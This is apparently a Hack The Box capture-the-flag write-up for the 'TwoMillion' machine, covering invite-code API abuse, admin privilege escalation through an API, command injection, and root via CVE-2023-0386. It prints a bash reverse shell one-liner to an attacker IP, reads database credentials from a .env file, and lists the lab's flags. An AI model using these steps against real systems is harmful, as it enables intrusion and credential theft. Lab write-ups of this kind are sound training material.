# Network
There are two `TCP` ports are open
	- 22 : ssh is running and not vulnerable to Rce
 
	- 80 : on 80 `2million.htb` is hosted which is old version of HTB
# Web
There is old version of htb is running on port 80
Nothing special found on home page except `JOIN NOW` page which is redirecting us to `/invite` page
	
 ![Screenshot from 2023-09-22 10-25-05](https://github.com/iammR0OT/HTB/assets/74102381/497c590a-68f8-4eba-bb49-02497ee743ef)

On invite page it is asking about some kind of `invite code` which we didn't have any
	
 ![Screenshot from 2023-09-22 10-26-22](https://github.com/iammR0OT/HTB/assets/74102381/1bf0dea8-f336-40a0-8c27-88629a9a8964)

Lets check the source code of it and the network tab that which files is it requesting while loading the page
In source code we found interesting file path called `/js/inviteapi.js`
	
 ![Screenshot from 2023-09-22 10-29-47](https://github.com/iammR0OT/HTB/assets/74102381/1082a6cb-8141-4135-b8e9-21c538f92969)

There are some functions present in this file
	
 ![Screenshot from 2023-09-22 10-31-38](https://github.com/iammR0OT/HTB/assets/74102381/f8d2a165-6d72-4d5c-930b-00b09b422c93)

Lets beautify the JS code using `jsbeautifier`
We found two function in that code 
	one is for **verifyInvideCode** which is probably taking the invite code and checking it on server side if it is valid or not
	and the second one is **makeInviteCode** which is requesting `/api/v1/invite/how/to/generate` api and creating a invitation code  
	
 ![Screenshot from 2023-09-22 10-32-57](https://github.com/iammR0OT/HTB/assets/74102381/9780e2c6-43cf-4341-ba0f-2c7de00cca98)

Lets hit this api and check if it allow us to generate code without any authentication
We will use `curl` and `jq` 
	Curl for making POST request and jq for josn data reading it is basically json parser
	We will use command `curl -X POST "http://2million.htb/api/v1/invite/how/to/generate" | jq .`
	We got some Encrypted data and the encryption type which is `ROT13`
	
 ![Screenshot from 2023-09-22 10-42-22](https://github.com/iammR0OT/HTB/assets/74102381/6bdca938-6798-435c-8cfd-c4742a965339)

After decryption we get a path saying that to it generate a key we have to request to `/api/v1/invite/generate` api
	
 ![Screenshot from 2023-09-22 10-44-13](https://github.com/iammR0OT/HTB/assets/74102381/cb2fc858-98b3-438f-9716-8d0476d348f0)

After requesting we got a session cookie base64 encoded, after decoding that we found a valid invite code `396E7-KEQJT-2896J-C7UC7`
	
 ![Screenshot from 2023-09-22 10-47-43](https://github.com/iammR0OT/HTB/assets/74102381/55fa964d-8210-4732-83fc-e170417ea29e)

Now we have Invite code lets insert code and found what's next
We found Registration page, Lets register as a admin user
	
 ![Screenshot from 2023-09-22 10-50-32](https://github.com/iammR0OT/HTB/assets/74102381/5561b551-48a4-4832-8642-0330752aa4ae)

Now we login as a admin user, let see what things we can do here
Wo here are 3 pages that we can look at
	/changelog
	/rule
	/access
	
 ![Screenshot from 2023-09-22 11-13-58](https://github.com/iammR0OT/HTB/assets/74102381/b73b0f2d-c2fb-4bb4-a552-33e1598f261b)

In access page there is vpn regenerate functionality which is requesting `/api/v1/user/vpn/regenerate` to regenerate vpn
Lets look at this in burpsuite
When we test the api and move back to the directory one by one we discover some endpoints in `/api/v1` 
	
 ![Screenshot from 2023-09-22 11-19-00](https://github.com/iammR0OT/HTB/assets/74102381/f074a18a-0131-4592-9048-94ed48d0b868)
	
 ![Screenshot from 2023-09-22 12-00-35 1](https://github.com/iammR0OT/HTB/assets/74102381/0b8cbf2c-fb9c-4b54-a43b-4b571c37231f)

There are 3 interesting endpoints
	api/v1/admin/settings/update
	api/v1/admin/auth
	api/v1/admin/vpn/generate
Lets request to `api/v1/admin/settings/update`
We update the our simple user to admin using `/api/v1/admin/settings/update` endpoint
	I face some errors like
		**Invalid content type**: i resolve this by changing the **Content-Type:** header to **application/json** which means the the content will be in the form of json
		**Missing parameter email**: i resolve this by adding {"email":"admin@gmail.com"} which is email account i used to login as a user on machine
		**Missing parameter is_admin**: I resolve this by adding {"is_admin":1} which means it is an admin account
	
 ![Screenshot from 2023-09-22 11-38-32](https://github.com/iammR0OT/HTB/assets/74102381/77119d9c-e915-4479-b13f-7f156039637c)

	Using curl
	
 ![Screenshot from 2023-09-22 12-00-35 1](https://github.com/iammR0OT/HTB/assets/74102381/71dea82b-1454-48d7-9390-ca3b7327a0e6)

Now successfully our user becomes an admin on the machine 
Lets look at the `/api/v1/admin/vpn/generate`, which is generating vpn for admin user 
	While requesting that endpoint i face an error that the username parameter is missing. so i resolve this by adding` {"username":"admin"}`
And its generating vpn maybe there will be a bash command is running in the background 
Lets try to command injection in this
I found a successful command injection in the vpn generator field
	
 ![Screenshot from 2023-09-22 11-58-09](https://github.com/iammR0OT/HTB/assets/74102381/c70407e0-7fc2-40a9-9e90-4e3fce62b036)

# User found
Now we found command injection in password generator field lets try simple reverse shell in it  
	`bash -c 'bash -i >& /dev/tcp/10.10.14.56/9001 0>&1'`
	We got a shell
		
  ![Screenshot from 2023-09-22 12-04-22](https://github.com/iammR0OT/HTB/assets/74102381/2c18f914-dce5-4443-a82e-8664acfa4f8b)

	Wet make a shell stable using tty shell
		`python3 -c 'import pty;pty.spawn("/bin/bash")'`
		Using **CTRL+Z** making it background process and the using `stty raw -echo;fg` to make it foreground now whenever we need shell back we simply write this. this will get our shell back
		
  ![Screenshot from 2023-09-22 12-12-36](https://github.com/iammR0OT/HTB/assets/74102381/99390556-2e3e-49d0-b334-55dc29095ac4)

		Then `**export TERM=xterm**`
Now we login as WWW-data but we didn't have user shell lets enumerate the machine
After some enumeration i found file called database.php lets look into it if we found any database credentials in it
We found that mysql is running from that file
In **.env** file i found database credentials

![Screenshot from 2023-09-22 12-19-09 1](https://github.com/iammR0OT/HTB/assets/74102381/753114ae-4f03-4cb7-83d4-883da6684e78)

	DB_USERNAME=admin
	DB_PASSWORD=SuperDuperPass123
Now we have credentials lets try to login using ssh if that incorrect we will enumerate mysql database and we successfully login into **admin user** account
	
 ![Screenshot from 2023-09-22 12-21-44](https://github.com/iammR0OT/HTB/assets/74102381/5eb9d856-0114-4906-8d7e-9579b464f271)

Lets capture the user flag
	user = **6d7227a1f473d6204ea181aa99bc41e2**
# Privesc
Lets move to the privesc part
Lets enumerate the whole file system and find out what files are accessible by user admin 
	`find / -user admin 2>/dev/null | grep -v '^/run\|^/proc\|^/sys'` to check files except run folder, proc folder and sys folder
I found that there is a mail file accessible by admin user
	
 ![Screenshot from 2023-09-22 12-45-09](https://github.com/iammR0OT/HTB/assets/74102381/4586d010-f440-4a07-91d2-d2e3190b4b84)

The email is telling to admin that the kernel is outdated and vulnerable to **OverlayFS / FUSE**

![Screenshot from 2023-09-22 12-46-49](https://github.com/iammR0OT/HTB/assets/74102381/4928166f-f540-4fc8-bb5e-b477c06d1af0)

Lets explore it
It is kernel level exploit we just need to run cve files and it will give us root shell
	[refrence](https://github.com/xkaneiki/CVE-2023-0386/tree/main)
Root = **ef3883404d27fcad5ab69a9138eeeb64**

# Happy Hacking ❤
